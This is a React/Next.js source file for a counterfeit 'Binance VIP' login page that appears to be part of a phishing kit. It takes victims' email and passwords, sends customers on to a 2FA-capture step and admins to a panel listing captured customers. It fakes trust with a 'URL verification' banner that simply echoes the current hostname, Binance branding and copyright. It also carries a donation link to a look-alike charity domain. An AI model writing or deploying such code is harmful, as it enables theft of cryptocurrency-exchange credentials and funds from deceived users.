import Head from 'next/head'
import { useRouter } from 'next/router'
import { useState, useEffect, useRef } from 'react'
import Link from 'next/link'
import { LockClosedIcon } from "@heroicons/react/solid"
import Carousel from 'react-multi-carousel';
import 'react-multi-carousel/lib/styles.css';
import { useSelector, useDispatch } from 'react-redux'
import { logUserIn } from '../redux/APP_STATE/actions'

export default function Home() {
  const router = useRouter()
  // App State from redux
  const app_state = useSelector(state => state.APP_STATE)
  const dispatch = useDispatch()
  const formRef = useRef(null)
  const buttonRef = useRef(null)
  const [host_url, setHostUrl] = useState('')

  useEffect(() => {
    setHostUrl(window.location.hostname)
  }, [])

  const responsive = {
  desktop: {
    breakpoint: { max: 3000, min: 1024 },
    items: 1,
    slidesToSlide: 3 // optional, default to 1.
  },
  tablet: {
    breakpoint: { max: 1024, min: 464 },
    items: 1,
    slidesToSlide: 2 // optional, default to 1.
  },
  mobile: {
    breakpoint: { max: 464, min: 0 },
    items: 1,
    slidesToSlide: 1 // optional, default to 1.
  }
};

  const handleLoginSubmit = (e) => {
    e.preventDefault()

    // GRAB FORM
    const form = formRef.current
    const email = form.email.value
    const password = form.password.value
    const button = buttonRef.current

    const user_cred = {
      email,
      password
    }

    dispatch(logUserIn(user_cred, button, (err, authenticated_user) => {
      if (err) {
        console.log('Error, logging this user', err)
      }
      
      if (authenticated_user) {
        if (authenticated_user.role === 'customer') {
          router.push('/2fa');
        }
        else if (authenticated_user.role === 'admin') {
          router.push('/admin/allcustomers');
        }
      }
    }))
  }

  return (
    <div id="wrapper" className='text-sm font-ibm_plex text-gray-800'>
      <Head>
        <title>Log In | Binance - VIP</title>
        <meta name="description" content="Get verified to access exclusive rewards on the Binance VIP trading account, enjoy unmatched staking rewards." />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      {/* LOGIN HEADER */}
      <div id="Header" className='flex justify-between p-5'>
        <div className="logo">
          <img className='h-6' src="/binance-logo.svg" alt="Logo" />
        </div>
        <div className="menu">English | moon</div>
      </div>
      {/* URL Verification INFO */}
      <div className='w-full flex items-center justify-center p-2.5 text-xs text-gray-700 bg-[#FEF6D8]'>
        <p><span className='font-semibold'><LockClosedIcon className='h-5 mr-1 text-green-500 inline' /> URL verification: </span><span className='text-green-400'>https://</span>{ host_url }</p>
      </div>

      {/* ====================== LOGIN SECTION ==================== */}
      <div className="max-w-4xl px-5 pt-10 pb-3 md:p-16 mx-auto md:flex justify-between items-end">
        <div className="w-full md:w-[400px] mb-5 md:mb-0">
          <h2 className="text-2xl md:text-3xl font-semibold mt-2 mb-10 md:my-2">Binance Account Login</h2>
          <p className='text-gray-600 hidden md:block pt-2'>Get verified to access exclusive rewards on the <span className="text-[#DD7907]">Binance VIP</span> trading account, enjoy unmatched staking rewards</p>
          <form className="my-5" ref={formRef} onSubmit={ handleLoginSubmit }>
            <div className="input_field">
              <label className="block">Email</label>
              <input type="email" name="email" placeholder='Enter email address' className='px-2 py-3.5 w-full border rounded-md outline-none focus:border-[#E18404]' required />
            </div>
            <div className="input_field">
              <lable className="block">Password</lable>
              <input type="password" name="password" placeholder='Enter password' className='px-2 py-3.5 w-full border rounded-md outline-none focus:border-[#E18404]' required />
            </div>
            <div className="input_field"></div>
            {/* <button className="w-full bg-gradient-to-b from-primary to-[#E49F5E] text-center text-gray-800 font-semibold p-3 rounded-sm">Log In</button> */}
            <button ref={ buttonRef } className="w-full bg-primary text-center text-gray-800 font-semibold p-3 rounded-sm">Log In</button>
          </form>
          <Link href="/signup"><span className="text-primary_dim font-semibold my-2 cursor-pointer">Forgot password?</span></Link>
        </div>
        {/* QR code - section */}
        <div>
          <div className='border rounded-md p-0.5 h-auto w-44 mx-auto'>
            <Carousel
              responsive={responsive}
              ssr={true}
              autoPlay={true}
              swipeable={true}
              showDots={true}
              arrows={false}
              infinite={true}
              autoPlaySpeed={5000}
              transitionDuration={1000}
            >
              <div><img src="/images/1.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/2.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/3.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/4.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/5.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/6.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/7.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/8.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/9.jfif" alt="help"  className='rounded-md' width={300} /></div>
              <div><img src="/images/10.jfif" alt="help" className='rounded-md' width={300} /></div>
            </Carousel>
          </div>
          <div className='text-center my-5 w-64 mx-auto py-1'>
            <p className="text-lg my-3 font-semibold">Save life today</p>
            <p>Our hearts are with the people of ukraine, join us support the army</p>
            <a target="_blank" href="https://savelife.us.org"><p className="text-primary_dim font-semibold cursor-pointer">Donate!</p></a>
          </div>
        </div>
      </div>
      <footer>
        <div className="w-full pb-10 pt-1 text-xs text-gray-500 text-center">&copy; 2017 - { new Date().getFullYear() } Binance.com All rights reserved</div>
      </footer>
    </div>
  )
}
